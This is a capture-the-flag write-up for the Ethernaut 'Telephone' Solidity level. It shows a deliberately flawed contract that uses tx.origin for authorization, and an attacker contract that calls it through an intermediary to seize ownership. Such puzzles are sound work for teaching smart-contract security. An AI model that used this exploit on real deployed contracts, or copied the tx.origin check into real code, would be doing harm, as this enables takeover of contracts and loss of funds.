### Ethernaut telephone

Oh the dangers of tx.origin

To claim ownership of this contract, all we need to do is figure out how to call changeOwner  and have the tx.origin be different from the msg.sender.


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```


How can we do this? 

First of all what is the difference between tx.origin and msg.sender?
tx.origin refers to the external account that started the tx
msg.sender refers to the sender of the current transaction.


So if we initiate the transaction with our wallet, then have a contract call the changeOwner function, we will have created a scenario where tx.origin != msg.sender.


Here's an example of a contract that does that.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external view returns (address);
}

contract Attack {
    address telephoneContractAddress = 0x8e7dD33aCBf4fB55642479bD34B71385546e2A64;
    ITelephone telephoneContract = ITelephone(telephoneContractAddress);

    function getTelephoneOwner() public view returns (address) {
        return telephoneContract.owner();
    }

    function becomeOwner() public {
        telephoneContract.changeOwner(msg.sender);
    }
}
```